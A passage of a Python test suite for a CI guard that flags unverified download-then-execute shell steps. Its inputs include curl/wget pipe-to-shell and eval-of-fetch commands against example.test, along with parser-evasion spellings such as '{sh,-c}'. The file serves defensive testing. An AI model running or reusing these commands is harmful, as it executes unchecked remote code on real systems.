        for dest in ("cuda_1.run", "./cuda_1.run"):
            for use in ("chmod +x ./cuda_*.run\n", "sh ./cuda_*.run\n"):
                with self.subTest(dest=dest, use=use):
                    self.assertEqual([], self.job(dest, self.CHECK + use))

    def test_a_glob_that_cannot_match_is_not_a_use(self):
        for dest in ("cuda_1.run", "./cuda_1.run"):
            for use in ("chmod +x ./other_*.run\n", "sh ./other_*.run\n"):
                with self.subTest(dest=dest, use=use):
                    self.assertEqual([], self.job(dest, use))


class TestADollarSpelledPathOnEitherSideBindsByItsLastPart(unittest.TestCase):
    """#2345 (a), (b): after `curl -o cuda_1.run`, `sh "$PWD/cuda_1.run"` read
    clean -- #2310 read a word bash expands only where the COMMAND stands --
    and so did `sh ./cuda_*.run` after `curl -o "$PWD/cuda_1.run"`; bash 3.2
    and 5.2 run the download through each spelling. An operand bash expands
    whose last part is the download's basename is now the download, as a
    command word is, and a glob is matched against a download written to a
    `$`-spelled path by its last part. Loose on the side that RUNS only: a
    checksum still binds by its spelling."""

    GET = "curl -fsSLo %s https://example.test/cuda_1.run\n"
    CHECK = 'echo "%s  %%s" | sha256sum -c -\n' % ("a" * 64)

    def job(self, script):
        return [why for _n, why in wg.job_defects([("step", script)])]

    def test_an_operand_ending_in_its_basename_is_the_download(self):
        get = self.GET % "cuda_1.run"
        for use, how in (("sh $PWD/cuda_1.run\n", "running it under `sh`"),
                         ('sh "$PWD/cuda_1.run"\n', "running it under `sh`"),
                         ('sh "${PWD}/cuda_1.run" --silent\n', "running it under `sh`"),
                         ('sh "$(pwd)/cuda_1.run"\n', "running it under `sh`"),
                         ('D=$PWD\nsh "$D/cuda_1.run"\n', "running it under `sh`"),
                         ('sudo bash "`pwd`/cuda_1.run"\n', "running it under `bash`"),
                         ('chmod +x "$PWD/cuda_1.run"\n', "making it executable"),
                         ('install -m 755 "$PWD/cuda_1.run" /usr/local/bin/c\n', "installing it"),
                         ('cp "$PWD/cuda_1.run" /usr/local/bin/\n', "putting it on PATH")):
            with self.subTest(use=use):
                why = self.job(get + use)
                self.assertEqual(1, len(why), why)
                self.assertIn("-> cuda_1.run and %s" % how, why[0])

    def test_wherever_the_fetch_put_it(self):
        # What `$HOME` expands to is not evaluated, so this is read as running
        # the download too, which bash does not do from the checkout: the
        # fail-closed side to be wrong on, as for a command word (#2310).
        self.assertIn("running it under `bash`", "".join(
            self.job(self.GET % "cuda_1.run" + 'bash "$HOME/cuda_1.run"\n')))

    def test_a_check_before_it_clears_it_and_binds_by_its_spelling(self):
        get = self.GET % "cuda_1.run"
        self.assertEqual([], self.job(get + self.CHECK % "cuda_1.run" + 'sh "$PWD/cuda_1.run"\n'))
        self.assertIn("no checksum in the job names cuda_1.run", "".join(
            self.job(get + self.CHECK % "$PWD/cuda_1.run" + 'sh "$PWD/cuda_1.run"\n')))

    def test_another_last_part_or_an_option_is_not_the_download(self):
        get = self.GET % "cuda_1.run"
        for use in ('sh "$PWD/other.run"\n', 'sh "$PWD/cuda_1.run.sig"\n',
                    'sh "$PWD/cuda_1.run/.."\n', 'echo "$PWD/cuda_1.run"\n',
                    'sh ./x.sh --file="$PWD/cuda_1.run"\n', 'sh "$PWD/${NAME}"\n'):
            with self.subTest(use=use):
                self.assertEqual([], self.job(get + use))
        # Its directory, walked, still covers what is in it.
        self.assertIn("making it executable", "".join(self.job(
            self.GET % '"$PWD/cuda_1.run"' + 'chmod -R +x "$PWD"\n')))

    def test_a_glob_binds_a_download_written_to_a_dollar_spelled_path(self):
        get = self.GET % '"$PWD/cuda_1.run"'
        for use, how in (("sh ./cuda_*.run\n", "running it under `sh`"),
                         ("sh cuda_*.run\n", "running it under `sh`"),
                         ("chmod +x ./cuda_*.run\n", "making it executable")):
            with self.subTest(use=use):
                why = self.job(get + use)
                self.assertEqual(1, len(why), why)
                self.assertIn("-> $PWD/cuda_1.run and %s" % how, why[0])
        for script in (get + "sh ./other_*.run\n",
                       get + self.CHECK % "$PWD/cuda_1.run" + "sh ./cuda_*.run\n"):
            with self.subTest(script=script):
                self.assertEqual([], self.job(script))


class TestAUseInsideACommandSubstitution(unittest.TestCase):
    """#2345 (c): `curl -o t.sh …; x=$(bash t.sh)` read clean, because a use
    was looked for in each command's own argv and never in the script a
    substitution runs; bash 3.2 and 5.2 run the download there. The guard's
    walk already reads every substitution as a script of its own for what it
    FETCHES; a use written there is now read the same way, at the statement
    that holds it, and the sentence says where it is."""

    GET = "curl -fsSLo t.sh https://example.test/t.sh\n"
    CHECK = 'echo "%s  t.sh" | sha256sum -c -\n' % ("a" * 64)

    def job(self, script):
        return [why for _n, why in wg.job_defects([("step", script)])]

    def test_a_use_inside_a_substitution_is_a_use(self):
        for use, how in (("x=$(bash t.sh)\n", "running it under `bash`"),
                         ('echo "$(sh t.sh)"\n', "running it under `sh`"),
                         ("x=`bash t.sh`\n", "running it under `bash`"),
                         ("diff <(bash t.sh) <(echo ok)\n", "running it under `bash`"),
                         ("x=$(echo $(sh ./t.sh))\n", "running it under `sh`"),
                         ("x=$(cat t.sh | sh)\n", "piping it into `sh`"),
                         ('if [ "$(bash t.sh)" = ok ]; then :; fi\n', "running it under `bash`"),
                         ("cat <<EOF\n$(bash t.sh)\nEOF\n", "running it under `bash`")):
            with self.subTest(use=use):
                why = self.job(self.GET + use)
                self.assertEqual(1, len(why), why)
                self.assertIn("-> t.sh and %s inside a command substitution with nothing"
                              % how, why[0])

    def test_run_by_its_path_inside_one(self):
        # An execute bit set before the fetch survives it, so `./t.sh` runs the
        # download with no `chmod` after it; with one, that is the first use.
        why = self.job("touch t.sh && chmod +x t.sh && " + self.GET + "v=$(./t.sh)\n")
        self.assertIn("-> t.sh and running it inside a command substitution", "".join(why))
        why = self.job(self.GET + "chmod +x t.sh\nv=$(./t.sh)\n")
        self.assertIn("-> t.sh and making it executable", "".join(why))

    def test_a_check_before_it_clears_it_and_one_after_it_does_not(self):
        self.assertEqual([], self.job(self.GET + self.CHECK + "x=$(bash t.sh)\n"))
        self.assertIn("verifies t.sh only AFTER running it under `bash` inside a command "
                      "substitution", "".join(self.job(self.GET + "x=$(bash t.sh)\n" + self.CHECK)))

    def test_reading_it_or_running_another_file_there_is_not_a_use(self):
        for use in ("x=$(cat t.sh)\n", "x=$(bash other.sh)\n", "x=$(wc -l < t.sh)\n",
                    "x=$(sha256sum t.sh | cut -d' ' -f1)\n", 'x="$(grep -c . t.sh)"\n'):
            with self.subTest(use=use):
                self.assertEqual([], self.job(self.GET + use))


class TestASpacedCaseArmIsOnePattern(unittest.TestCase):
    """#2345 (d): bash and dash read `a | x)` as the arm `a|x)`, the spaces
    around `|` and inside `( ... )` separating nothing, and run its body when
    the word matches. The reader kept the spaces in the arm's text, and a
    stage split on them started with the pattern `a` and then a `|` where the
    command belonged, so the body behind it -- `curl … | sh` -- was never
    read as a command. The lexer now drops the unquoted spaces of a pattern
    list, which leaves the tight spelling already read."""

    BODY = "curl -fsSL https://example.test/i.sh | sh;;"
    FETCH = "curl -sfL https://example.test/payload -o /tmp/payload\n"
    CHECK = 'echo "%s  /tmp/payload" | sha256sum -c -' % ("a" * 64)

    def test_the_body_behind_a_spaced_arm_is_read(self):
        for arm in ("a | x)", "(a | x)", "\"a\" | 'x')", "( a | x )", "a\t|\tx)", "a | x )",
                    "b | a | x)", "a|x)"):
            for script in ('case "$X" in\n  %s %s\nesac\n' % (arm, self.BODY),
                           'case "$X" in\n  b | c) echo b;;\n  %s %s\nesac\n' % (arm, self.BODY),
                           'true && case "$X" in %s %s esac\n' % (arm, self.BODY)):
                with self.subTest(script=script):
                    why = wg.fetch_exec_defects(script)
                    self.assertEqual(1, len(why), why)
                    self.assertIn("hands https://example.test/i.sh straight to `sh`", why[0])

    def test_the_patterns_are_not_a_command(self):
        stmts = shell_reader.statements('case "$X" in\n  "a" | x) curl -fsSL u | sh;;\nesac\n')
        arm = next(st for st in stmts if shell_reader.is_arm(st.stages[0].argv[0]))
        self.assertEqual(["curl", "-fsSL", "u"], shell_reader.command(arm.stages[0].argv))
        self.assertEqual(["sh"], [str(w) for w in arm.stages[1].argv])

    def test_each_spaced_arm_is_a_branch_of_its_own(self):
        # Read, the use in the second arm is one the check in the first may
        # not have run before; beside it in one arm, the check clears it.
        other = (self.FETCH + 'case "$X" in\n  b | c) %s;;\n  a | d) chmod +x /tmp/payload;;\n'
                 "esac\n" % self.CHECK)
        self.assertIn("inside an `if`/`while` branch the use is not in",
                      wg.fetch_exec_defect(other) or "")
        same = (self.FETCH + 'case "$X" in\n  a | b) %s; chmod +x /tmp/payload;;\nesac\n'
                % self.CHECK)
        self.assertIsNone(wg.fetch_exec_defect(same))


class TestAGlobFromAnotherDirectoryReachesABareDownload(unittest.TestCase):
    """#2345 (e): the guard follows no `cd`, so `curl -o cuda_1.run …; cd s;
    sh ../cuda_*.run` read clean -- `../cuda_*.run` does not match the path
    `cuda_1.run` -- and bash 3.2 and 5.2 run the download from `s`. A glob
    whose directory part a bare download's name does not have is now matched
    by its last part; the same `../` on both sides was already a use."""

    GET = "curl -fsSLo %s https://example.test/cuda_1.run\n"
    CHECK = 'echo "%s  cuda_1.run" | sha256sum -c -\n' % ("a" * 64)

    def job(self, script):
        return [why for _n, why in wg.job_defects([("step", script)])]

    def test_a_glob_from_another_directory_is_a_use(self):
        get = self.GET % "cuda_1.run"
        for use, how in (("mkdir -p s\ncd s\nsh ../cuda_*.run\n", "running it under `sh`"),
                         ("mkdir -p s\ncd s\nchmod +x ../cuda_*.run\n", "making it executable"),
                         ("mkdir -p s\nsh s/../cuda_*.run\n", "running it under `sh`")):
            with self.subTest(use=use):
                why = self.job(get + use)
                self.assertEqual(1, len(why), why)
                self.assertIn("-> cuda_1.run and %s" % how, why[0])
        self.assertIn("-> ../cuda_1.run and running it under `sh`", "".join(
            self.job(self.GET % "../cuda_1.run" + "sh ../cuda_*.run\n")))

    def test_a_checksum_clears_it_and_another_name_is_not_it(self):
        # Quoted, the glob is no glob: bash names a file called `cuda_*.run`.
        get = self.GET % "cuda_1.run"
        for script in (get + self.CHECK + "mkdir -p s\ncd s\nsh ../cuda_*.run\n",
                       get + "mkdir -p s\ncd s\nsh ../other_*.run\n",
                       get + 'mkdir -p s\ncd s\nsh "../cuda_*.run"\n'):
            with self.subTest(script=script):
                self.assertEqual([], self.job(script))


class TestADownloadCarriedInAVariable(unittest.TestCase):
    """#2341: `x=$(curl -fsSL URL)` and then `eval "$x"`, `sh -c "$x"` or
    `echo "$x" | sh` read clean -- the fetch was read, writing to standard
    output, into a variable the guard never followed -- and bash 3.2 and 5.2
    run the download through each. A whole-word variable a plain fetch
    substitution assigned earlier in the step is now that fetch's output
    where it is handed to a shell as its script: no file ever holds it, so
    no checksum clears it, as none clears `eval "$(curl URL)"`."""

    GET = "x=$(curl -fsSL https://example.test/i.sh)\n"
    SAID = ("carries https://example.test/i.sh in `$x` and hands it to `%s`%s, so there "
            "is no file to check")

    def job(self, *scripts):
        return [why for _n, why in wg.job_defects(
            [("step %d" % n, script) for n, script in enumerate(scripts)])]

    def test_handed_whole_to_a_shell_it_is_the_download(self):
        for get in (self.GET, 'x="$(curl -fsSL https://example.test/i.sh)"\n',
                    "x=$(wget -qO- https://example.test/i.sh)\n",
                    "export x=$(curl -fsSL https://example.test/i.sh)\n"):
            for use, to in (('eval "$x"\n', "eval"), ("eval $x\n", "eval"),
                            ('eval "${x}"\n', "eval"), ('sh -c "$x"\n', "sh -c"),
                            ('bash -c "$x"\n', "bash -c"), ('echo "$x" | sh\n', "sh"),
                            ("printf '%s\\n' \"$x\" | bash\n", "bash")):
                with self.subTest(get=get, use=use):
                    why = self.job(get + use)
                    self.assertEqual(1, len(why), why)
                    self.assertIn(self.SAID % (to, ""), why[0])

    def test_wherever_the_step_hands_it_over(self):
        for script, to, where in (
                (self.GET + 'y=$(echo "$x" | sh)\n', "sh", " inside a command substitution"),
                (self.GET + 'echo "$x" | tr -d "\\r" | sh -s -- --yes\n', "sh -s -- --yes", ""),
                ("f() {\n  local x=$(curl -fsSL https://example.test/i.sh)\n  eval \"$x\"\n}\n"
                 "f\n", "eval", ""),
                (self.GET + "x=$(curl -fsSL https://example.test/i.sh)\neval \"$x\"\n", "eval", ""),
                (self.GET + 'bash <(echo "$x")\n', "bash", ""),
                (self.GET + "source <(printf '%s\\n' \"$x\")\n", "source", ""),
                (self.GET + 'eval "$(echo "$x")"\n', "eval", "")):
            with self.subTest(script=script):
                why = self.job(script)
                self.assertEqual(1, len(why), why)
                self.assertIn(self.SAID % (to, where), why[0])
        # A whole copy holds it too, and the sentence names the variable used.
        for copy in ('y="$x"\n', "y=$x\n", 'export y="${x}"\n'):
            with self.subTest(copy=copy):
                why = self.job(self.GET + copy + 'eval "$y"\n')
                self.assertEqual(1, len(why), why)
                self.assertIn("carries https://example.test/i.sh in `$y` and hands it to `eval`",
                              why[0])
        # A script handed to `eval` in a substitution was refused already, in
        # a job that downloads (`substitution_script`); it now says what runs.
        why = self.job(self.GET + 'y=$(eval "$x")\n')
        self.assertEqual(2, len(why), why)
        self.assertIn("hands a script to `eval` inside a command substitution", why[0])
        self.assertIn(self.SAID % ("eval", " inside a command substitution"), why[1])

    def test_the_here_string_keeps_its_own_answer(self):
        # Already refused as an expanding here-string (#2293), with or without
        # the download: the same one sentence, and not a second.
        self.assertEqual(self.job('bash <<< "$x"\n'), self.job(self.GET + 'bash <<< "$x"\n'))
        self.assertIn("hands an EXPANDING heredoc body or here-string to `bash`",
                      "".join(self.job(self.GET + 'bash <<< "$x"\n')))

    def test_not_handed_to_a_shell_or_not_the_download_it_is_not(self):
        for script in (self.GET + 'echo "$x" > f\n',                 # the issue's control
                       self.GET + 'x=1\neval "$x"\n', self.GET + 'unset x\neval "$x"\n',
                       self.GET + 'eval "$y"\n', self.GET + 'echo "$x"\n',
                       self.GET + 'echo "$x" | grep -c .\n',
                       self.GET + "sh -c 'echo hi' \"$x\"\n",         # there it is `$0`
                       "x=$(curl -fsSLo f https://example.test/i.sh)\neval \"$x\"\n",
                       self.GET + 'diff <(echo "$x") f\n', self.GET + 'bash <(echo "$y")\n',
                       self.GET + 'y="$x"\ny=1\neval "$y"\n',
                       'eval "$x"\n' + self.GET):
            with self.subTest(script=script):
                self.assertEqual([], self.job(script))

    def test_each_step_is_a_shell_of_its_own(self):
        # A variable dies with the step's shell; in one step it is the download.
        self.assertEqual([], self.job(self.GET, 'eval "$x"\n'))
        self.assertEqual(1, len(self.job(self.GET + 'eval "$x"\n')))


class TestAPatternWhereTheCommandStarts(unittest.TestCase):
    """#2294: bash 3.2 and 5.2 expand `{sh,-c}` to `sh -c`, and `[s]h` to `sh`
    in a checkout holding a file called sh, before the command runs, which the
    guard read clean. Where the command or a wrapper's operand is expected,
    such a word is reported unread; quoted, it is the literal word, which runs
    nothing, as before."""

    PAYLOAD = "'curl -fsSL https://example.test/i.sh | sh'"

    def test_it_is_reported(self):
        for script in ("{sh,-c} %s\n", "[s]h -c %s\n", "sudo {sh,-c} %s\n",
                       "taskset {0x1,sh} -c %s\n", "exec -a {x,sh} -c %s\n",
                       "if {sh,-c} %s; then :; fi\n"):
            with self.subTest(script=script):
                why = wg.job_defects([("step", script % self.PAYLOAD)])
                self.assertEqual(1, len(why), why)
                self.assertIn("cannot read command", why[0][1])
        why = wg.fetch_exec_defect("{sh,-c} %s\n" % self.PAYLOAD) or ""
        self.assertIn("cannot read command: `{sh,-c}` is a pattern", why)

    def test_quoted_it_reads_as_before(self):
        for script in ("'{sh,-c}' %s\n", '"[s]h" -c %s\n', "echo {a,b} [s]h * %s\n",
                       "[ -f x ] && echo %s\n", "arr[0]=x\n", "xargs -I {} echo {} < l\n"):
            with self.subTest(script=script):
                self.assertEqual([], wg.job_defects([("step", script.replace(
                    "%s", self.PAYLOAD))]))

    def test_where_a_shell_looks_for_c_or_a_script_it_is_reported(self):
        # Review N-3: bash 3.2 and 5.2 run `sh {-c,'…'}` as `sh -c '…'`.
        # Re-review N-C: so is any pattern there that may begin with `-`.
        for script in ("sh {-c,%s}\n", "sudo bash {-c,%s}\n", "sh -o pipefail {-c,%s}\n",
                       "sh [-]c %s\n", "bash -{c,x} %s\n"):
            with self.subTest(script=script):
                why = wg.job_defects([("step", script % self.PAYLOAD)])
                self.assertIn("looks for `-c` or a script", why[0][1] if why else "")
        for script in ("bash lint.sh src/*.py\n", "sh -c 'echo' {a,b}\n"):
            with self.subTest(script=script):
                self.assertEqual([], wg.job_defects([("step", script)]))

    def test_a_program_a_shell_is_handed_as_a_glob_binds_a_download(self):
        # Re-review N-C: a pattern that cannot begin with `-` is the program,
        # and runs a download it matches -- `sh ./cuda_*.run` after `curl -o
        # cuda_1.run`, which bash 3.2 and 5.2 run and base read clean for the
        # `./`. The glob binds with a leading `./` dropped and a brace read as
        # `*`, and with a `$` in it by its last part, which r1 reported as a
        # pattern alone; with nothing fetched it runs nothing unchecked.
        get = ("get", "curl -fsSL -o cuda_1.run https://example.test/c\n")
        for use in ("sh ./cuda_*.run --silent", "sudo sh ./cuda_*.run", "bash ./cuda_{1,2}.run",
                    "chmod +x ./cuda_*.run", 'sh "$PWD"/cuda_*.run', "sh $(pwd)/cuda_*.run",
                    "sh ${X}*"):
            with self.subTest(use=use):
                self.assertIn("cuda_1.run", "".join(w for _n, w in wg.job_defects(
                    [get, ("run", use + "\n")])))
        with self.subTest(use="checked, then sh ./cuda_*.run"):
            check = 'echo "%s  cuda_1.run" | sha256sum -c -\n' % ("a" * 64)
            self.assertEqual([], wg.job_defects([get, ("run", check + "sh ./cuda_*.run\n")]))
        for script in ("sh scripts/*.sh\n", "bash [a-c]*.sh\n", "bash -n scripts/*.sh\n",
                       "sudo sh ./cuda_*.run\n", "bash ./build-{a,b}.sh\n", "sh ./configure*\n"):
            with self.subTest(script=script):
                self.assertEqual([], wg.job_defects([("step", script)]))
        with self.subTest(use="a download no glob matches"):
            self.assertEqual([], wg.job_defects([get, ("run", 'sh "$D"/*.sh ./x_*.run\n')]))

    def test_inside_an_expansion_or_arithmetic_there_is_none(self):
        # Review N-1: bash globs nothing written inside `${...}`, `((...))` or
        # `$((...))`, and these idioms were reported from #2294 on.
        for script in ("(( a[1]++ ))\n", "(( count[$k]++ ))\n", "${CMD[@]} --flag\n",
                       "${x#*/} --version\n", "${x%.*}\n", "if (( a[i] > 0 )); then :; fi\n",
                       "$(( a[1] * 2 )) --flag\n"):
            with self.subTest(script=script):
                self.assertEqual([], wg.job_defects([("step", script)]))
        # The must-trips: a pattern beside or inside them, where bash globs it.
        for script in ("${x}[s]h -c %s\n", "(( a[1]++ )) && [s]h -c %s\n",
                       "((echo) ; [s]h -c %s)\n", "(( $([s]h -c %s) ))\n"):
            with self.subTest(script=script):
                why = wg.job_defects([("step", script % self.PAYLOAD)])
                self.assertIn("is a pattern", why[0][1] if why else "")

    def test_in_a_conditional_an_array_or_an_extglob_group_there_is_none(self):
        # Re-review I-5: 16 jobs in 10 calibration-pool repos, 14 of them
        # fetching nothing, failed on #2294's rule, where the reader put these
        # words where a command starts. Bash runs none of them: a conditional
        # expands no pattern, an array literal globs its words into the array,
        # and an extglob group is part of its word (`shopt -s extglob`).
        for script in ("results=(files/x/*)\n", "blockmaps=(static/dist/*.blockmap)\n",
                       "A=(${DIR}/*)\n", "arr=(*.txt)\n",
                       "files=(\n  dist/*.dmg\n  dist/*.exe\n)\n", "files+=(\n  **/*.sh\n)\n",
                       "declare -A t=(\n  [n8n]=${V}\n)\n",
                       "f() {\n  local -a x=( *.sh )\n}\n",
                       "if [[ $v =~ ^2\\.(0|[1-9]*)$ ]]; then :; fi\n",
                       "[[ $d =~ ME([[:space:]]|(\\\\[rn]))+ ]]\n",
                       "case 1.2 in\n  +([0-9]).+([0-9]) ) echo ok ;;\nesac\n",
                       "for f in @(*.deb|*.zip); do echo \"$f\"; done\n",
                       "rm -rf !(keep|*.md)\n", "x=@(a|b)\n"):
            with self.subTest(script=script):
                self.assertEqual([], wg.job_defects([("step", script)]))
        # The must-trips: a pattern where a command starts, beside them or in a
        # substitution inside them; an extglob group that is the command or
        # stands where `sh` looks for `-c`, which bash with `extglob` on expands
        # (`@(sh)` to `sh`, given a file `sh`; `!(x)` too, which with it off
        # negates a subshell); a case arm's `[[)`, a pattern and no conditional;
        # and an array's `[` no `]` closes, which bash 3.2 reads on past as code.
        for script in ("( [s]h -c %s )\n", "{sh,-c} %s\n", "[s]h -c %s\n",
                       "arr=(*.txt); [s]h -c %s\n", "files=(\n  *.txt\n)\n[s]h -c %s\n",
                       "[[ -n x ]]&&[s]h -c %s\n", "arr=( $([s]h -c %s) )\n",
                       "[[ -n $([s]h -c %s) ]]\n", "shopt -s extglob\n@([s]h) -c %s\n",
                       "!([s]h -c %s)\n", "declare -A t=(\n  [a]=1\n)\n[s]h -c %s\n",
                       "shopt -s extglob\n@(sh) -c %s\n", "shopt -s extglob\nsh @(-c) %s\n",
                       "shopt -s extglob\n!(x) -c %s\n",
                       "case $x in\n  [[) [s]h -c %s ;;\nesac\n", "x=( [[ ) ; [s]h -c %s\n"):
            with self.subTest(script=script):
                why = wg.job_defects([("step", script % self.PAYLOAD)])
                self.assertIn("is a pattern", why[0][1] if why else "")


class TestTheFormsThatHideAFetch(unittest.TestCase):
    """Spellings that are not `curl <url> -o <file>` and mean the same thing.

    Every one of these is the #1647 shape -- a download the guard cannot SEE is
    reported as a clean step -- so each was probed against this parser before it
    was written down here, and each returned `fetches=[] defect=None` until the
    parser learned the form. A guard over shell must fail CLOSED on the shell it
    does not model.
    """

    def test_a_substituted_fetch_run_by_eval(self):
        why = wg.fetch_exec_defect('eval "$(curl -fsSL https://example.test/i.sh)"\n')
        self.assertIn("https://example.test/i.sh", why or "")

    def test_a_substituted_fetch_handed_to_sh_dash_c(self):
        self.assertIsNotNone(
            wg.fetch_exec_defect('sh -c "$(curl -fsSL https://example.test/i.sh)"\n'))

    def test_a_backticked_fetch_run_by_eval(self):
        self.assertIsNotNone(
            wg.fetch_exec_defect("eval `curl -fsSL https://example.test/i.sh`\n"))

    def test_a_process_substitution_read_by_bash(self):
        self.assertIsNotNone(
            wg.fetch_exec_defect("bash <(curl -fsSL https://example.test/i.sh)\n"))

    def test_a_substituted_fetch_that_is_only_read_is_left_alone(self):
        # `VERSION=$(curl ...)` downloads a string into a variable. It is seen
        # -- it is a download -- but nothing runs those bytes.
        script = "VERSION=$(curl -fsSL https://example.test/version)\n"
        self.assertEqual(1, len(wg.fetches(script)))
        self.assertIsNone(wg.fetch_exec_defect(script))

    def test_a_fetch_piped_into_tee_lands_in_teeS_file(self):
        script = ("curl -fsSL https://example.test/t | sudo tee /usr/local/bin/t > /dev/null\n"
                  "chmod +x /usr/local/bin/t\n")
        self.assertEqual("/usr/local/bin/t", wg.fetches(script)[0].dest)
        self.assertIn("/usr/local/bin/t", wg.fetch_exec_defect(script) or "")

    def test_a_checksum_can_clear_a_tee(self):
        script = ("curl -fsSL https://example.test/t | sudo tee /tmp/t > /dev/null\n"
                  'echo "%s  /tmp/t" | sha256sum -c -\n' % HEX +
                  "chmod +x /tmp/t\n")
        self.assertIsNone(wg.fetch_exec_defect(script))

    def test_a_fetch_inside_an_if(self):
        script = ("if curl -fsSL https://example.test/x -o /tmp/x; then\n"
                  "  chmod +x /tmp/x\n"
                  "fi\n")
        self.assertIn("/tmp/x", wg.fetch_exec_defect(script) or "")

    def test_a_use_inside_a_loop_body(self):
        script = ("curl -fsSL https://example.test/p -o /tmp/p\n"
                  "while true; do /tmp/p; done\n")
        self.assertIsNotNone(wg.fetch_exec_defect(script))

    def test_curls_output_dir(self):
        script = ("curl -fsSLO --output-dir /tmp https://example.test/payload\n"
                  "chmod +x /tmp/payload\n")
        self.assertEqual("/tmp/payload", wg.fetches(script)[0].dest)
        self.assertIsNotNone(wg.fetch_exec_defect(script))

    def test_wgets_directory_prefix(self):
        script = ("wget -P /tmp https://example.test/payload\n"
                  "chmod +x /tmp/payload\n")
        self.assertEqual("/tmp/payload", wg.fetches(script)[0].dest)
        self.assertIsNotNone(wg.fetch_exec_defect(script))

    def test_a_process_substitution_in_a_redirect(self):
        # M4: `bash < <(curl ...)` is the #1647 signature with one more layer:
        # the redirect target was discarded before substitutions were read, so
        # the fetch was not seen AT ALL.
        script = "bash < <(curl -fsSL https://example.test/i.sh)\n"
        self.assertEqual(1, len(wg.fetches(script)))
        self.assertIsNotNone(wg.fetch_exec_defect(script))

    def test_a_substitution_inside_an_unquoted_heredoc_body(self):
        # L5: `<<EOF` expands; `<<'EOF'` does not. The body of the expanding
        # one is shell, and a fetch in it reaches the interpreter reading it.
        script = "bash <<EOF\n$(curl -fsSL https://example.test/i.sh)\nEOF\n"
        self.assertEqual(1, len(wg.fetches(script)))
        self.assertIsNotNone(wg.fetch_exec_defect(script))

    def test_a_quoted_heredoc_body_is_literal_text(self):
        script = "cat <<'EOF' > /tmp/note\n$(curl -fsSL https://example.test/i.sh)\nEOF\n"
        self.assertEqual([], wg.fetches(script))

    def test_a_fetch_inside_a_function_body(self):
        # M1: `f() { ... }` is where a long step keeps its download, and the
        # function name stood where the command was expected.
        for opener in ("f() {", "f () {", "function f {"):
            script = (opener + " curl -fsSL https://example.test/x -o /tmp/x; }\n"
                      "f\nchmod +x /tmp/x\n")
            self.assertEqual(1, len(wg.fetches(script)), opener)
            self.assertIsNotNone(wg.fetch_exec_defect(script), opener)

    def test_a_fetch_inside_a_subshell(self):
        script = ("( curl -fsSL https://example.test/x -o /tmp/x )\n"
                  "chmod +x /tmp/x\n")
        self.assertEqual(1, len(wg.fetches(script)))
        self.assertIsNotNone(wg.fetch_exec_defect(script))

    def test_a_download_with_no_parseable_url_is_reported_not_dropped(self):
        # L2: `wget -i list.txt` downloads a LIST of URLs to names this guard
        # cannot know. Unparsed is not clean; say so.
        why = wg.fetch_exec_defect("wget -i list.txt\n")
        self.assertIsNotNone(why)
        self.assertIn("wget", why)

    def test_asking_curl_its_version_is_not_a_download(self):
        for script in ("curl --version\n", "wget --help\n", "curl -V\n"):
            self.assertEqual([], wg.fetches(script), script)
            self.assertIsNone(wg.fetch_exec_defect(script), script)

    def test_a_substitution_carrying_a_heredoc_marker_does_not_crash(self):
        # #1697 review F7: the OUTER parse lifts the heredoc body and leaves
        # `@@heredoc0@@` inside the substitution's text; re-reading that text
        # is a second parse whose tables are empty. A guard that raises
        # reports nothing at all, which is worse than reporting a gap.
        for script in ('eval "$(cat <<\'EOF\'\n'
                       "curl -sfL https://example.test/p -o /tmp/p\n"
                       "chmod +x /tmp/p\n"
                       'EOF\n)"\n',
                       'sh -c "$(cat <<\'EOF\'\nhello\nEOF\n)"\n',
                       'X="$(cat <<\'EOF\'\nhello\nEOF\n)"\n'):
            wg.fetch_exec_defect(script)        # must not raise
            wg.fetches(script)

    def test_a_shifted_left_string_is_not_a_heredoc(self):
        # `<<` inside a quoted string has no terminator line; reading it as a
        # heredoc swallows the rest of the step, and every statement after it
        # disappears from the guard.
        script = ('echo "shift << 2"\n'
                  "curl -fsSL https://example.test/p | sh\n")
        self.assertEqual(1, len(wg.fetches(script)))
        self.assertIsNotNone(wg.fetch_exec_defect(script))

    def test_a_destination_carried_in_a_variable(self):
        # `TMP=$(mktemp)` is how a careful step names its download, and the
        # guard follows the NAME the shell uses, not a resolved path.
        script = ('TMP="$(mktemp)"\n'
                  'curl -fsSL https://example.test/p -o "$TMP"\n'
                  'chmod +x "$TMP"\n')
        self.assertEqual("$TMP", wg.fetches(script)[0].dest)
        self.assertIsNotNone(wg.fetch_exec_defect(script))

    def test_an_md5_check_is_not_a_sha256_check(self):
        # `-c` on a weaker digest tool is a check of something, but not of what
        # this rule is about; the old regex read `sha256sum|shasum` and this
        # one reads a list, so the list is what gets asserted.
        script = ("curl -fsSL https://example.test/p -o /tmp/p\n"
                  'echo "%s  /tmp/p" | md5sum -c -\n' % ("a" * 32) +
                  "chmod +x /tmp/p\n")
        self.assertIsNotNone(wg.fetch_exec_defect(script))

    def test_a_numeric_chmod_that_sets_any_execute_bit(self):
        script = ("curl -fsSL https://example.test/p -o /tmp/p\n"
                  "chmod 750 /tmp/p\n")
        self.assertIsNotNone(wg.fetch_exec_defect(script))


class TestTheHadolintStep(unittest.TestCase):
    """The real step this rule was written for, in both answers (carried over
    from `tests/test_workflow_pins.py`'s TestFetchExecRule)."""

    HADOLINT = ("curl -sfL --connect-timeout 5 --max-time 60 --retry 3 \\\n"
                "  -o /tmp/hadolint \\\n"
                "  https://example.test/hadolint-Linux-x86_64\n"
                "chmod +x /tmp/hadolint\n"
                "sudo mv /tmp/hadolint /usr/local/bin/hadolint\n")

    def test_the_unverified_fetch_and_exec_is_a_defect(self):
        self.assertIn("/tmp/hadolint", wg.fetch_exec_defect(self.HADOLINT))

    def test_a_checksum_clears_it(self):
        verified = self.HADOLINT.replace(
            "chmod +x", 'echo "$SHA  /tmp/hadolint" | sha256sum -c -\nchmod +x')
        self.assertIsNone(wg.fetch_exec_defect(verified))

    def test_a_checksum_after_the_chmod_is_still_a_defect(self):
        late = self.HADOLINT.replace(
            "sudo mv", 'echo "$SHA  /tmp/hadolint" | sha256sum -c -\nsudo mv')
        self.assertIn("only AFTER", wg.fetch_exec_defect(late))

    def test_an_interpreter_invocation_counts_as_executing(self):
        script = ("curl -sfL https://example.test/i.py -o /tmp/i.py\n"
                  "python3 /tmp/i.py\n")
        self.assertIn("/tmp/i.py", wg.fetch_exec_defect(script))


class TestASwallowedCheckIsNotACheck(unittest.TestCase):
    """M2: a checksum whose non-zero exit nobody sees verified nothing.

    Runners default to `bash -e`, which is what makes `sha256sum -c` a GATE:
    the job stops. Put the check on the left of `||`, in the background, or
    under a negation and the step sails past a mismatch -- while the guard,
    reading only the command name, called it verified.
    """

